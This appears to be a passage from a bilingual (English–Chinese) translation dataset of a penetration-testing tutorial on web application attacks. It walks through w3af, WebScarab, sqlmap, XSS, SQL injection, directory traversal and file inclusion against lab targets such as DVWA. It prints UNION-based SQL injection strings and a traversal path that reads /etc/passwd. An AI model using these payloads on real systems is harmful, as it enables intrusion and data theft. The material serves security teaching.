- en: '`w3af/plugins/output/config:console>>> back`'
  id: totrans-136
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:console>>> 返回`'
- en: '`w3af/plugins>>> audit`'
  id: totrans-137
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 审计`'
- en: '`w3af/plugins>>> audit htaccess_methods, os_commanding, sqli, xss`'
  id: totrans-138
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 审计 htaccess_methods, os_commanding, sqli, xss`'
- en: '`w3af/plugins>>> back`'
  id: totrans-139
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 返回`'
- en: '`w3af>>> target`'
  id: totrans-140
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af>>> 目标`'
- en: '`w3af/config:target>>> help`'
  id: totrans-141
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/config:target>>> 帮助`'
- en: '`w3af/config:target>>> view`'
  id: totrans-142
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/config:target>>> 查看`'
- en: '`w3af/config:target>>> set target http://http://192.168.0.30/mutillidae/index.php?page=login.php`'
  id: totrans-143
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/config:target>>> 设置目标 http://http://192.168.0.30/mutillidae/index.php?page=login.php`'
- en: '`w3af/config:target>>> back`'
  id: totrans-144
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/config:target>>> 返回`'
- en: '`w3af>>>`'
  id: totrans-145
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af>>>`'
- en: 'At this point, we have configured all of the required test parameters. Our
    target will be evaluated against the SQL injection, cross-site scripting, OS-commanding,
    and htaccess misconfiguration using the following command:'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 此时，我们已经配置了所有必需的测试参数。我们将使用以下命令对目标进行SQL注入、跨站脚本、OS命令执行和htaccess配置错误进行评估：
- en: '[PRE6]'
  id: totrans-147
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: '![](img/5c207d32-7caa-41bc-aac2-8b89828588e3.png)'
  id: totrans-148
  prefs: []
  type: TYPE_IMG
  zh: '![](img/5c207d32-7caa-41bc-aac2-8b89828588e3.png)'
- en: As you can see, we have discovered a cross-site scripting vulnerability in the
    target web application. A detailed report is also created in HTML and sent to
    the `root` folder. This report details all of the vulnerabilities, including the
    debug information about each request and response data transferred between W3AF
    and the target web application.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 正如您所看到的，我们已经发现了目标Web应用程序中的跨站脚本漏洞。还创建了一个详细的HTML报告，并发送到`root`文件夹。该报告详细说明了所有的漏洞，包括关于每个请求和W3AF与目标Web应用程序之间传输的响应数据的调试信息。
- en: The test case that we presented in the preceding code does not reflect the use
    of other useful plugins, profiles, and exploit options. Hence, we strongly recommend
    that you drill through various exercises present in the user guide. These are
    available at [http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf](http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf).
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在前面的代码中呈现的测试案例并未反映出其他有用插件、配置文件和利用选项的使用。因此，我们强烈建议您浏览用户指南中提供的各种练习。这些可以在[http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf](http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf)找到。
- en: WebScarab
  id: totrans-151
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: WebScarab
- en: WebScarab is a powerful web application security-assessment tool. It has several
    modes of operation, but is mainly operated through the intercept proxy. This proxy
    sits between the end user's browser and the target web application, to monitor
    and modify the requests and responses that are being transmitted on either side.
    This process helps the auditor manually craft the malicious request and observe
    the response thrown back by the web application. It has a number of integrated
    tools, such as fuzzer, session ID analysis, spider, web services analyzer, XSS
    and CRLF vulnerability scanner, and transcoder.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: WebScarab是一个强大的Web应用程序安全评估工具。它有几种操作模式，但主要通过拦截代理进行操作。该代理位于最终用户的浏览器和目标Web应用程序之间，以监视和修改在两侧传输的请求和响应。这个过程帮助审计人员手动制作恶意请求并观察Web应用程序返回的响应。它具有许多集成工具，如模糊器、会话ID分析、蜘蛛、Web服务分析器、XSS和CRLF漏洞扫描器以及转码器。
- en: 'To start WebScarab lite, navigate to Applications | Web Application Analysis
    | webscarab or, in a Terminal, type the following:'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 要启动WebScarab lite，请转到应用程序 | Web应用程序分析 | webscarab，或者在终端中输入以下内容：
- en: '[PRE7]'
  id: totrans-154
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'This will pop up the lite edition of WebScarab. For our exercise, we are going
    to transform it into a full-featured edition by navigating to Tools | Use full-featured
    interface in the menu bar. This will confirm the selection and you should restart
    the application accordingly. Once you restart the WebScarab application, you will
    see a number of tool tabs on your screen. Before we start our exercise, we need
    to configure the browser to the local proxy (`127.0.0.1, 8008`) in order to browse
    the target application via the WebScarab intercept proxy. If you want to change
    the local proxy (IP address or port), navigate to the Proxy | Listeners tab. The
    following steps will help you analyze the target application''s session ID:'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
- en: Once the local proxy has been set up, you should browse to the target website
    (for example, `http://192.168.0.30/mutillidae`) and visit as many links as possible.
    This will increase the probability of catching any known and unknown vulnerabilities.
    Alternatively, you can select the target under the Summary tab, right-click, and
    choose Spider tree. This will fetch all of the available links in the target application.
  id: totrans-156
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: If you want to check the request and response data for the particular page mentioned
    at the bottom of the Summary tab, double-click on it and you can see the parsed
    request in a tabular and raw format. However, the response can also be viewed
    in HTML, XML, text, and hex formats.
  id: totrans-157
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'During the test period, we may decide to fuzz one of our target application
    links that have the parameters (for example, `artist=1`) with the `GET` method.
    This may reveal any unidentified vulnerability, if it exists. Right-click on the
    selected link and choose the Use as fuzz template. Now, click on the Fuzzer tab
    and manually apply different values to the parameter by clicking on the Add button
    near the Parameters section. In our case, we wrote a small text file listing the
    known SQL injection data (for example, `1 AND 1=2`, `1 AND 1=1`, and single quote
    `('')`), and provided it as a source for the fuzzing parameter value. This can
    be accomplished using the Sources button under the Fuzzer tab. Once your fuzz
    data is ready, click on Start. After all tests are complete, you can double-click
    on an individual request and inspect its response. In one of our test cases, we
    discovered a MySQL injection vulnerability:'
  id: totrans-158
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Error**: You have an error in your SQL syntax; check the manual that corresponds
    to your MySQL server version for the right syntax to use near `''\''` at line
    `1`'
  id: totrans-159
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Warning**: `mysql_fetch_array()`: supplied argument is not a valid MySQL
    result resource in `/var/www/vhosts/default/htdocs/ listproducts.php` on line
    `74`'
  id: totrans-160
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: In our last test case, we decided to analyze the target application's session
    ID. For this purpose, go to the `SessionID` Analysis tab and choose Previous Requests
    from the combo box. Once the chosen request has been loaded, go to the bottom,
    select samples (for example, `20`), and click on Fetch to retrieve various samples
    of session IDs. After that, click on the Test button to start the analysis process.
    You can see the results on the Analysis tab and the graphical representation on
    the Visualization tab. This process determines the randomness and unpredictability
    of session IDs, which could result in hijacking other users' sessions or credentials.
  id: totrans-161
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: This tool has a variety of options and features, which could potentially add
    cognitive value to penetration testing. To get more information about the WebScarab
    project, visit [http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project](http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project).
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
- en: Cross-Site Scripting
  id: totrans-163
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '**Cross-Site Scripting** (**XSS**) attacks are still very common today. It
    is a type of injection attack where an attacker injects malicious scripts or code
    into requests sent by the web application. These attacks succeed due to user input
    not being validated correctly before it''s sent to the server.'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
- en: 'There were initially two types of XSS, but, in 2005, a third was discovered:'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
- en: '**Stored XSS: **Storage XSS occurs when the user input is stored on the target
    server and is not validated. The storage can be a database, forum, or comment
    field. The victim unknowingly retrieves the stored data from the web app, which
    the browser thinks is safe to render because of the inherent trust between the
    client and server. Because the input is actually stored, Stored XSS is considered
    to be persistent or permanent.'
  id: totrans-166
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Reflected XSS:** Reflected XSS occurs when user input is immediately returned
    by a web app in the form of an error message, search result, or any other response
    that includes some or all of the input provided by the user as part of the request,
    without that data being made safe to render in the browser, and without permanently
    storing the user provided data.'
  id: totrans-167
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**DOM XSS:** The **Document Object Model** (**DOM**) is a programming API for
    HTML and XML documents. It defines the logical structure of documents and the
    way a document is accessed and manipulated. DOM-based XSS is a form of XSS where
    the entire tainted data flow from source to sink takes place in the browser, that
    is, the source of the data is in the DOM, the sink is also in the DOM, and the
    data flow never leaves the browser.'
  id: totrans-168
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Testing for XSS
  id: totrans-169
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'To test for XSS vulnerabilities, we''ll be using JavaScript and standard HTML:'
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
- en: '**Testing for Reflected XSS**'
  id: totrans-171
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Remember what we stated before: Reflected XSS is named so because user input
    is immediately processed and returned by the web app. To test for it, we need
    to find a field that accepts user input.'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s log in to the DVWA page that we cracked the password for previously.
    At the main page, there will be a menu on the left:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/ad32e445-d743-411b-a2b3-96b8e3dec20f.jpg)'
  id: totrans-174
  prefs: []
  type: TYPE_IMG
- en: 'Select DVWA Security and, in the drop-down box, select low then click Submit.
    By doing this, we''ve set up the web app to operate as though the input is not
    being validated:'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/88e197b2-2f66-48e2-b358-e395caf986e4.jpg)'
  id: totrans-176
  prefs: []
  type: TYPE_IMG
- en: 'For our first test, navigate on the page that XSS reflected in the left menu.
    In the input field, type the following JavaScript:'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  id: totrans-178
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: '![](img/a46d1be3-8682-4f93-8c01-43272eaef9ec.jpg)'
  id: totrans-179
  prefs: []
  type: TYPE_IMG
- en: Click Submit.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
- en: 'If successful, you should a pop-up message box with the Allows XSS message:'
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/aa2300bf-9929-42bf-98fb-7538ad7fe838.jpg)'
  id: totrans-182
  prefs: []
  type: TYPE_IMG
- en: 'Let''s try another. Type the following:'
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  id: totrans-184
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: '![](img/c27042ef-9252-49be-a00a-65ed7b3c4e94.jpg)'
  id: totrans-185
  prefs: []
  type: TYPE_IMG
- en: This redirects the browser to a different website, in our case, [google.com](https://www.google.com/?gws_rd=ssl).
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
- en: '**Testing for Stored XSS**'
  id: totrans-187
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Stored XSS is named so because it stores itself in a location, albeit a database,
    and anytime a user visits the affected site, the code executes. An attacker can
    easily send key information, such as a cookie, to a remote location. To test for
    it, we need to find a field that accepts user input, for example, a comment field.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s navigate on the page that XSS stored in the left menu. We are presented
    with two input fields: Name and Message. This simulates a basic Comments or Feedback
    form found on many websites. In the Name field, enter whatever name you would
    like, but in the Message field enter the following code and click Sign Guestbook:'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  id: totrans-190
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: '![](img/bf3fa090-98cd-494c-ad9c-b1f933ea6971.jpg)'
  id: totrans-191
  prefs: []
  type: TYPE_IMG
- en: 'Here''s the popup we get:'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/aa79f930-1705-4457-9a63-ba75275b73f1.jpg)'
  id: totrans-193
  prefs: []
  type: TYPE_IMG
- en: Now, if we navigate away from this page, say to the Home page, then return to
    the XSS stored page, our code should run again and present a popup with the cookie
    for the current session. This can be expanded upon greatly, and with a bit more
    knowledge of JavaScript, an attacker can do a lot of damage.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
- en: SQL injection
  id: totrans-195
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: SQL injection, or SQLi, is an attack on an SQL database where a code or database
    query is inserted via some form of input from a client to the application. SQLi
    is one of the oldest vulnerabilities, but still one of the most common and, since
    SQL-based databases are so common, one of the most dangerous.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
- en: The severity of SQL injection attacks is limited by the attacker's skill and
    imagination, and to a lesser extent, defense in depth countermeasures, such as
    low-privilege connections to the database server. In general, consider SQL injection
    a high-impact severity.
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
- en: Before we can inject SQL, we should have a basic understanding of SQL and also
    understand database structures.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
- en: 'SQL is considered a fourth-generation programming language because it uses
    standard human-understandable words for its syntax: just English and brackets.
    SQL is used for databases and we can use it to create tables; add records, delete,
    and update, set permissions to users; and so on.'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
- en: 'Here''s a basic query to create a table:'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  id: totrans-201
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: The preceding code says create a table named `employee` with the following columns,
    `first`, `last`, `age`, `address`, and `city`, then state and assign their data
    types with `varchar(15)` character limits [Variable Character, with a max of 15
    characters], and number(3) [Numbers only, max 3 numbers therefore 999].
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
- en: 'Here is a basic query (also known as a `select` statement) to retrieve data
    from a table:'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  id: totrans-204
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: The `select` statement is the query we'll be exploiting.
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
- en: When you log in to a website, it sends a select query/statement to the database
    to retrieve the data to confirm the data you logged in with.
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s say the login page looks like this:'
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/0ea426a2-6048-413d-a465-163d3eec76ac.jpg)'
  id: totrans-208
  prefs: []
  type: TYPE_IMG
- en: 'The query on the backend when logging in may look like this:'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  id: totrans-210
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: The preceding statement says select all (`*`) from the table named users where
    the column `username=`  is the variable username (Login field) and the column
    `password =` is the variable password (Password field).
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
- en: Manual SQL injection
  id: totrans-212
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Now that we understand the basics of SQL queries, let''s use this to our advantage.
    Working with DVWA for this again, log in to DVWA and go to SQL Injection:'
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/14c10021-743c-416a-bf0b-4300034cf931.jpg)'
  id: totrans-214
  prefs: []
  type: TYPE_IMG
- en: We can see that this page has a field for the user to enter the User ID of someone.
    If we enter `1` here, the application should tell us which user has User ID 1.
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s do a simple test for SQL Injection. In the User ID field, instead of
    entering a number, enter the following:'
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
- en: '`%’ or ‘1’=’1`:'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/b219451f-4172-4fee-adcf-67a087ce569a.jpg)'
  id: totrans-218
  prefs: []
  type: TYPE_IMG
- en: 'Let''s assume that the initial query looks like this:'
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  id: totrans-220
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'We assume the table is named `users_table`, with the relative column names.
    What we''ve done is changed the preceding statement to look like this:'
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  id: totrans-222
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'Then click Submit. Our result should be all the data in the table, as shown:'
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/207d7906-063a-4a70-a8b1-b9d6337e13f8.jpg)'
  id: totrans-224
  prefs: []
  type: TYPE_IMG
- en: The `%` means mod and will return `false`. But we added the OR operator. So
    since the first part of the query will return `false` (because of the `%`), the
    OR will force it to execute the second part, `'1'='1`, which is `true`. Thus,
    because everything the query runs, it's always `true` for every record in the
    table, SQL prints out all the records of the table.
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
- en: 'Here are a few other queries you can try:'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
- en: 'Get the username of the account being used to connect between the web application
    and the database: `%'' or 0=0 union select null, user() #`'
  id: totrans-227
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Get the current database that we''ve been pulling data from: `%'' or 0=0 union
    select null, database() #`'
  id: totrans-228
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Display the information schema table: The `information_schema` table is a database
    that stores information about all of the other databases; `%'' and 1=0 union select
    null, table_name from information_schema.tables #`'
  id: totrans-229
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Display database tables: Using data from the previous query, we can find out
    what the table is: `%'' and 1=0 union select null, table_name from information_schema.tables
    where table_name like ''user%''#`'
  id: totrans-230
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Automated SQL injection
  id: totrans-231
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Now that we understand what SQL injection looks like, let's take a look at some
    tools that can automate this process.
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
- en: sqlmap
  id: totrans-233
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: sqlmap is a tool built into Kali that can be used to identify and exploit SQLi
    vulnerabilities. For this example, we're going to use Burp Suite to gather some
    data that we'll need to give to `sqlmap` to work.
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
- en: Launch Burp Suite and proceed to set up the browser to route all traffic through
    its proxy. Ensure that intercept is on. Go to the SQL Injection page on the DVWA
    application and enter a user ID; in this case, I'll enter `1`.
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
- en: 'Burp will catch the request. Forward it on until the request completes. You
    should see your result on the web page. Go to the Target tab, select the DVWA
    IP (`192.168.0.19` in my case) and use the arrow heads to drill down through the
    results following the URL path, `http://192.168.0.19/dvwa/vulnerabilities/sqli/`
    (you can confirm this in the browser''s address bar):'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/0ec95d23-9cdb-47f4-8baa-e4461a05bc4f.jpg)'
  id: totrans-237
  prefs: []
  type: TYPE_IMG
- en: 'Select the request with the `200` status (HTML code `200`):'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/762ccbec-2e12-4090-ab03-6e4ac68f9677.jpg)'
  id: totrans-239
  prefs: []
  type: TYPE_IMG
- en: 'In the Request tab, we get the information we need—the actual request that''s
    being sent by the web application (Referrer) which is in the first line: `/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit`
    and we get the PHP session ID or Cookie:'
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/924facf8-48fe-429e-bb1e-7b6d6412c9d4.jpg)'
  id: totrans-241
  prefs: []
  type: TYPE_IMG
- en: 'With this data, let''s open a Terminal and enter the following to get the Database
    User, as we did with the manual steps:'
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE16]'
  id: totrans-243
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: 'This is one line with no breaks at `--cookie`:'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/4e54b488-4dda-4eee-b4de-1fda3b1bfddc.jpg)'
  id: totrans-245
  prefs: []
  type: TYPE_IMG
- en: '`-u`: For the target URL we got from Burp'
  id: totrans-246
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`--cookie`: For the cookie information we captured with Burp'
  id: totrans-247
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`-b`: To display the database banner'
  id: totrans-248
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`--current-db`: To get the current database'
  id: totrans-249
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`--current-user`: To get the current user of the current database:'
  id: totrans-250
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '![](img/3e6e8774-b7cb-4834-90c3-9e9a9d215982.jpg)'
  id: totrans-251
  prefs: []
  type: TYPE_IMG
- en: 'You will be prompted during the test, and you can safely press *Enter* to accept
    the defaults. There is only one prompt where I did not use that default, purely
    for the sake of time:'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/86a8851c-f0ba-4c31-91fc-2e219323a931.jpg)'
  id: totrans-253
  prefs: []
  type: TYPE_IMG
- en: 'At the end, we are presented with the results:'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/888d2a28-948f-4e74-9f54-d295f46cb8b6.jpg)'
  id: totrans-255
  prefs: []
  type: TYPE_IMG
- en: We get information on the operating system (`Ubuntu 10.04`) that's running the
    database, the server-side technology (`PHP 5.3.2 and Apache 2.2.14`), the database
    (`MySQL`), the current database (`dvwa`), and the current user (`dvwa`).
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
- en: To get a listing of all the options available to you for `sqlmap`, simply type
    `sqlmap -h` in the Terminal and if you want more advanced options, enter `sqlmap
    --hh`.
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
- en: Command-execution, directory-traversal, and file-inclusion
  id: totrans-258
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Command-injection is a type of attack where the main goal is to have system
    commands be executed by the host operating system of a vulnerable application.
    These types of attacks are possible when unsafe user input is passed from the
    application to a system shell. The commands that are supplied are executed at
    the privilege level of the application, for example, a web server may be run with
    a `www-data` user or Apache user as opposed to the root user.
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
- en: Directory-traversal is when a server allow an attacker to read a file or directories
    outside of the normal web server directory.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
- en: File-inclusion vulnerabilities are vulnerabilities that allows an attacker to
    include a file to a web server by exploiting vulnerable inclusion procedures.
    This type of vulnerability occurs, for instance, when a page receives as input
    the path to the file that has to be included and this input is not properly sanitized,
    allowing for an attacked to inject directory-traversal characters (`../`).
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
- en: File-inclusion, directory-traversal, and command-injection are all attack vectors
    that work in tandem.
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
- en: Directory-traversal and file-inclusion
  id: totrans-263
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Let's begin by testing to see whether we can get the web application to jump
    up one directory.
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
- en: 'We''ll be in the DVWA app again. Log in and navigate to the File Inclusion
    page from the menu on the left:'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/960d200a-726a-4737-9e48-a4058627a381.jpg)'
  id: totrans-266
  prefs: []
  type: TYPE_IMG
- en: 'In the address bar in the browser, you should see `<IP Address>/dvwa/vulnerabilities/fi/?page=include.php`.
    Let''s change `include.php` to `index.php` and see what happens:'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/7d396c69-c85c-4608-9ea5-fe698301e84f.jpg)'
  id: totrans-268
  prefs: []
  type: TYPE_IMG
- en: '![](img/63e95547-5f9f-461f-baa3-a64416f63e6c.jpg)'
  id: totrans-269
  prefs: []
  type: TYPE_IMG
- en: Nothing happens, suggesting that there is no `index.php` in this directory.
    We know that `index.php` exists, however it's in the `/dvwa` directory. How do
    we know this? When we used Burp Suite to crack the credentials to the `login.php`
    page, we saw that a successful login redirected the user to `index.php`. You will
    not see `index.php` in the browser, as `index.php` is the default root page for
    PHP (`default.asp` for ASP) and so, by default does not display it. To test, you
    simply click on the Home button in the menu of DVWA and after `/dvwa`, enter `/index.php`.
    This will take you to the same home page.
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
- en: 'Navigate to the File-Inclusion page again. Looking at the URL, we see that
    we''re currently in `/dvwa/vulnerability/fi/`, which is two directories down from
    our root directory of `dvwa`. In the address of the browser, remove `include.php`,
    this time replacing it with `../../index.php`. Press *Enter* and let''s see what
    happens:'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/a7c902c8-f055-45ec-9b6c-6a88fc7d9c99.jpg)'
  id: totrans-272
  prefs: []
  type: TYPE_IMG
- en: Sure enough, it takes us to the Home page. Great. We've successfully traversed
    the directory structure of the web server and, since we used a file local to the
    system, we now know that **Local-File Inclusion** (**LFI**) is possible.
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
- en: From our previous results with `sqlmap` and `nikto`, we know the operating system
    that this `apache` server is running on is Linux (Ubuntu). By default, in Linux,
    `apache` stores its files in the `/var/www/html/` directory. Linux stores essential
    user information in the `/etc/passwd` file and hashed user passwords in the `/etc/shadow`
    file. With this knowledge, let's try changing directories to see the `/etc/passwd`
    file.
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
- en: On the File Inclusion page again, remove `include.php` and enter `../../../../../../etc/passwd`.
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
- en: '`../../../../../../` takes us through `/var/www/html/dvwa/vulnerability/fi/`
    up to  `/`:'
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/d6487a78-666a-4aee-9284-022051392e82.jpg)'
  id: totrans-277
  prefs: []
  type: TYPE_IMG
- en: '![](img/022de721-b309-411c-a6ae-b65448ed2bc0.jpg)'
  id: totrans-278
  prefs: []
  type: TYPE_IMG
- en: We successfully changed directories up six then down one to `/etc`, gaining
    access to the `passwd` file. What we see is the contents of the `passwd` file.
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
- en: 'Here''s a screenshot of it copied into a text file and cleaned up:'
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/051c5396-7aab-44f8-96b2-0c3acdd40cea.jpg)'
  id: totrans-281
  prefs: []
  type: TYPE_IMG
- en: The `x` after the first `:` symbol means that this account has a password and
    it is stored hashed in the `/etc/shadow` file.
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
- en: Knowing that we can traverse the directories and that LFI is possible, let's
    now attempt a **Remote File-Inclusion** (**RFI**) attack.
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
- en: 'Our next step is to pass a file from a remote server (our Kali system) to our
    target system. In a Terminal, enter the following:'
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  id: totrans-285
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: This starts the `apache` web server on our system. You can test it by going
    to the browser, entering your system IP, and you will be presented with the default
    `apache` HTML page.
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
- en: 'Back on the DVWA application, navigate to the File Inclusion page. In the address
    bar, replace `include.php` with the path to your `webserver/index.html`:'
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/58b45f1e-0414-4116-b741-1659f157f4b1.jpg)'
  id: totrans-288
  prefs: []
  type: TYPE_IMG
- en: 'It successfully opens `index.html`, which is hosted on our web server. RFI
    is possible on this system:'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/e0204f7d-5e25-4a31-a112-8d41eed6f097.jpg)'
  id: totrans-290
  prefs: []
  type: TYPE_IMG
- en: Command execution
  id: totrans-291
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Command-injection vulnerabilities allow an attacker to inject commands into
    poorly-validated user input. This input is used in used in some form by the system
    shell and in the process, the command injected gets executed on the system.
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
- en: One case where you may find this is an application that takes user input, for
    example a username or email address, and creates a folder on the system that's
    used to house that user's data, file uploads, and so on.
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
- en: 'In our target system, DVWA, there is a page that is used to demonstrate this
    flaw by exploiting user input that is passed to the system ping command. Let''s
    log in to DVWA again on the OWASP Broken Apps VM and select command injection
    from the menu on the left:'
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/b3b29310-7227-4a21-9efb-c8409a910a60.jpg)'
  id: totrans-295
  prefs: []
  type: TYPE_IMG
- en: 'As stated before, this input is passed to the ping command, which should be
    an IP Address. We can confirm this by passing `127.0.0.1`:'
